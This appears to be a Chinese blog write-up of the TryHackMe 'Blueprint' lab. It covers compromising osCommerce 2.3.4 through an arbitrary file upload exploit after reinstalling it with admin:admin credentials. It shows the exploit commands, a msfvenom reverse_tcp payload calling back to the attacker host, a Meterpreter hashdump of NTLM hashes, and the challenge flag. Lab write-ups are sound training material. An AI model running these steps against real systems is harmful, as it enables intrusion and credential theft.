@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_easy_Buleprint | S1ient</title><meta name="author" content="S1ient"><meta name="copyright" content="S1ient"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="BlueprintHack into this Windows machine and escalate your privileges to Administrator. 端口扫描，有很多端口    序号 Host 地址 端口 协议 Uri 地址 标题 Banner 状态码    1 10.144.148.185 443 HTTPS https:&#x2F;&#x2F;10.144.148.185:443 Inde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_easy_Buleprint">
+<meta property="og:url" content="https://s1ient.github.io/post/3401368e.html">
+<meta property="og:site_name" content="S1ient">
+<meta property="og:description" content="BlueprintHack into this Windows machine and escalate your privileges to Administrator. 端口扫描，有很多端口    序号 Host 地址 端口 协议 Uri 地址 标题 Banner 状态码    1 10.144.148.185 443 HTTPS https:&#x2F;&#x2F;10.144.148.185:443 Inde">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-12T11:30:03.000Z">
+<meta property="article:modified_time" content="2026-05-12T11:32:04.921Z">
+<meta property="article:author" content="S1ient">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://s1ient.github.io/post/3401368e.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_easy_Buleprint',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-12 19:32:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="S1ient" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="S1ient"><span class="site-name">S1ient</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_easy_Buleprint</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-12T11:30:03.000Z" title="发表于 2026-05-12 19:30:03">2026-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-12T11:32:04.921Z" title="更新于 2026-05-12 19:32:04">2026-05-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"></div></div></div><article class="post-content" id="article-container"><h1 id="Blueprint"><a href="#Blueprint" class="headerlink" title="Blueprint"></a>Blueprint</h1><p>Hack into this Windows machine and escalate your privileges to Administrator.</p>
+<p>端口扫描，有很多端口</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>Host 地址</th>
+<th>端口</th>
+<th>协议</th>
+<th>Uri 地址</th>
+<th>标题</th>
+<th>Banner</th>
+<th>状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>10.144.148.185</td>
+<td>443</td>
+<td>HTTPS</td>
+<td><a target="_blank" rel="noopener" href="https://10.144.148.185/">https://10.144.148.185:443</a></td>
+<td>Index of &#x2F;</td>
+<td>Apache-HTTP-Server&#x2F;2.4.23,Apache-Web-Server,Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28, 列目录</td>
+<td>200</td>
+</tr>
+<tr>
+<td>2</td>
+<td>10.144.148.185</td>
+<td>80</td>
+<td>HTTP</td>
+<td>10.144.148.185:80</td>
+<td></td>
+<td>UnKnown</td>
+<td>0</td>
+</tr>
+<tr>
+<td>3</td>
+<td>10.144.148.185</td>
+<td>3306</td>
+<td>MYSQL</td>
+<td>10.144.148.185:3306</td>
+<td></td>
+<td>UnKnown</td>
+<td>0</td>
+</tr>
+<tr>
+<td>4</td>
+<td>10.144.148.185</td>
+<td>135</td>
+<td>RPC</td>
+<td>10.144.148.185:135</td>
+<td></td>
+<td>Microsoft Windows RPC</td>
+<td>0</td>
+</tr>
+<tr>
+<td>5</td>
+<td>10.144.148.185</td>
+<td>139</td>
+<td>NETBIOS</td>
+<td>10.144.148.185:139</td>
+<td></td>
+<td>Microsoft Windows netbios-ssn</td>
+<td>0</td>
+</tr>
+<tr>
+<td>6</td>
+<td>10.144.148.185</td>
+<td>8080</td>
+<td>HTTP</td>
+<td><a target="_blank" rel="noopener" href="http://10.144.148.185:8080/">http://10.144.148.185:8080</a></td>
+<td>Index of &#x2F;</td>
+<td>Apache-Web-Server, 列目录，Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28,Apache-HTTP-Server&#x2F;2.4.23</td>
+<td>200</td>
+</tr>
+<tr>
+<td>7</td>
+<td>10.144.148.185</td>
+<td>445</td>
+<td>SMB</td>
+<td>10.144.148.185:445</td>
+<td></td>
+<td>UnKnown</td>
+<td>0</td>
+</tr>
+</tbody></table>
+<p>访问 <code>8080</code> 端口，是一个文件目录，依次点击来到 <code>/oscommerce-2.3.4/catalog</code>，是一个网页</p>
+<p>根据路径知道使用了 <code>oscommerce-2.3.4</code></p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/port_8080.png" alt="port_8080"></p>
+<p>先来目录扫描，得到了有 <code>admin</code>，<code>download</code>，<code>install</code> 等地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># gobuster dir -u http://10.144.148.185:8080/oscommerce-2.3.4/catalog/  -w /usr/share/wordlists/dirb/common.txt  </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.8.2</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.144.148.185:8080/oscommerce-2.3.4/catalog/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.8.2</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Admin                (Status: 301) [Size: 373] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/Admin/]</span><br><span class="line">admin                (Status: 301) [Size: 373] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/]</span><br><span class="line">ADMIN                (Status: 301) [Size: 373] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/ADMIN/]</span><br><span class="line">Download             (Status: 401) [Size: 1322]</span><br><span class="line">download             (Status: 401) [Size: 1322]</span><br><span class="line">ext                  (Status: 301) [Size: 371] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/ext/]</span><br><span class="line">images               (Status: 301) [Size: 374] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/images/]</span><br><span class="line">Images               (Status: 301) [Size: 374] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/Images/]</span><br><span class="line">includes             (Status: 301) [Size: 376] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/includes/]</span><br><span class="line">index.php            (Status: 200) [Size: 15466]</span><br><span class="line">install              (Status: 301) [Size: 375] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/install/]</span><br><span class="line">pub                  (Status: 301) [Size: 371] [--&gt; http://10.144.148.185:8080/oscommerce-2.3.4/catalog/pub/]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>目录扫描的同时用 <code>searchsploit</code> 搜索相关漏洞</p>
+<p>可以利用的有文件上传和远程代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># searchsploit oscommerce 2.3.4</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">osCommerce 2.3.4 - Multiple Vulnerabilities                                                      | php/webapps/34582.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;currency&#x27; SQL Injection                                                    | php/webapps/46328.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;products_id&#x27; SQL Injection                                                 | php/webapps/46329.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;reviews_id&#x27; SQL Injection                                                  | php/webapps/46330.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;title&#x27; Persistent Cross-Site Scripting                                     | php/webapps/49103.txt</span><br><span class="line">osCommerce 2.3.4.1 - Arbitrary File Upload                                                       | php/webapps/43191.py</span><br><span class="line">osCommerce 2.3.4.1 - Remote Code Execution                                                       | php/webapps/44374.py</span><br><span class="line">osCommerce 2.3.4.1 - Remote Code Execution (2)                                                   | php/webapps/50128.py</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问扫描出来的地址，在 <code>/oscommerce-2.3.4/catalog/install</code> 发现一个安装页面</p>
+<p>点击开始按钮安装</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install.png" alt="install"></p>
+<p>这里数据库服务器地中默认是 <code>localhost</code>，但是我修改为靶场地址后会出错，因此需要修改 <code>hosts </code> 文件</p>
+<p>用户名用 <code>root</code>，无密码，数据库名则是 <code>osCommerce</code></p>
+<p>点击继续按钮</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install2.png" alt="install2"></p>
+<p>点击继续按钮</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install3.png"></p>
+<p>其他信息乱填，管理员账号密码均为 admin</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install4.png" alt="install4"></p>
+<p>访问 <code>/admin</code>，可以登录</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/admin.png"></p>
+<p>下载之前搜索到的任意文件上传利用脚本文件 <code>43191.py</code>，上传<code>单文件 PHP shell</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># python2 43191.py -u http://10.144.148.185:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php</span><br><span class="line">[+] Authentication successful</span><br><span class="line">[+] Successfully prepared the exploit and created a new newsletter with nID 1</span><br><span class="line">[+] Successfully locked the newsletter. Now attempting to upload..</span><br><span class="line">[*] Now trying to verify that the file shell.php uploaded..</span><br><span class="line">[+] Got a HTTP 200 Reply for the uploaded file!</span><br><span class="line">[+] The uploaded file should now be available at http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/oscommerce-2.3.4/catalog/admin/shell.php</code></p>
+<p>执行 <code>whoami </code>得知是最高权限，进入 <code>Desktop</code> 查看 <code>root.txt.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BLUEPRINT$@BLUEPRINT: C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin # whoami</span><br><span class="line"> nt authority\system</span><br><span class="line"></span><br><span class="line">BLUEPRINT$@BLUEPRINT: C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin # cd C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLUEPRINT$@BLUEPRINT:C:\Users\Administrator\Desktop# dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 14AF-C52C</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">11/27/2019  07:15 PM    &lt;DIR&gt;          .</span><br><span class="line">11/27/2019  07:15 PM    &lt;DIR&gt;          ..</span><br><span class="line">11/27/2019  07:15 PM                37 root.txt.txt</span><br><span class="line">               1 File(s)             37 bytes</span><br><span class="line">               2 Dir(s)  19,505,848,320 bytes free</span><br><span class="line"></span><br><span class="line">BLUEPRINT$@BLUEPRINT: C:\Users\Administrator\Desktop #type root.txt.txt</span><br><span class="line">THM&#123;aea1e3ce6fe7f89e10cea833ae009bee&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个题目要求我们获取 <code>lab</code> 用户的 <code>NTML hash</code> 值并解密</p>
+<p><code>msf</code> 里面有一个 <code>hashdump</code>命令 可以获取该值</p>
+<p>先用 <code>msfvenom</code> 生成反弹 <code>payload</code>，然后用 <code>43191.py</code> 将 <code>shell.exe</code> 上传</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.140.133 LPORT=4444 -f exe &gt; shell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">                                                                                                                                </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# python2 43191.py -u http://10.144.148.185:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.exe</span><br><span class="line">[+] Authentication successful</span><br><span class="line">[+] Successfully prepared the exploit and created a new newsletter with nID 2</span><br><span class="line">[+] Successfully locked the newsletter. Now attempting to upload..</span><br><span class="line">[*] Now trying to verify that the file shell.exe uploaded..</span><br><span class="line">[+] Got a HTTP 200 Reply for the uploaded file!</span><br><span class="line">[+] The uploaded file should now be available at http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>我这里比较特殊，我是 win11 用 openvpn 连接的靶场，所以 kali 虚拟机能访问靶场地址，但是无法接受靶场的反弹，因此需要进行端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=192.168.80.128</span><br></pre></td></tr></table></figure>
+
+<p>进入 <code>msfconsole</code>，使用 <code>exploit/multi/handler</code> 模块，设置 <code>port</code> 以及 <code>ip</code>，然后 <code>run</code> 开启监听</p>
+<p>再去之前的 shell 处运行 shell.exe</p>
+<p><code>BLUEPRINT$@BLUEPRINT:C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin# shell.exe</code></p>
+<p>成功反弹，执行 hashdump 获取Lab 用户的哈希值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.80.128</span><br><span class="line">LHOST =&gt; 192.168.80.128</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.128:4444 </span><br><span class="line">[*] Sending stage (199238 bytes) to 192.168.80.1</span><br><span class="line">[*] Sending stage (199238 bytes) to 192.168.80.1</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.128:4444 -&gt; 192.168.80.1:4321) at 2026-05-12 19:01:11 +0800</span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::</span><br></pre></td></tr></table></figure>
+
+<p>在 <a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 网站进行解密</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/Hashes.png" alt="Hashes"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://s1ient.github.io">S1ient</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://s1ient.github.io/post/3401368e.html">https://s1ient.github.io/post/3401368e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://s1ient.github.io" target="_blank">S1ient</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/381630bb.html" title="TryHackMe_easy_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_easy_VulnNet:Internal</div></div></a></div><div class="next-post pull-right"><a href="/post/6c602f0e.html" title="TryHackMe_easy_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_easy_Creative</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/cbbda74.html" title="TryHackMe_easy_Tony the Tiger"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-13</div><div class="title">TryHackMe_easy_Tony the Tiger</div></div></a></div><div><a href="/post/6sfd5316.html" title="TryHackMe_easy_Library"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-11</div><div class="title">TryHackMe_easy_Library</div></div></a></div><div><a href="/post/6c602f0e.html" title="TryHackMe_easy_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_easy_Creative</div></div></a></div><div><a href="/post/381630bb.html" title="TryHackMe_easy_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_easy_VulnNet:Internal</div></div></a></div><div><a href="/post/85d3263d.html" title="TryHackMe_easy_IDE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-11</div><div class="title">TryHackMe_easy_IDE</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023/03/25 - 2026 By S1ient</div></div></footer></div><div 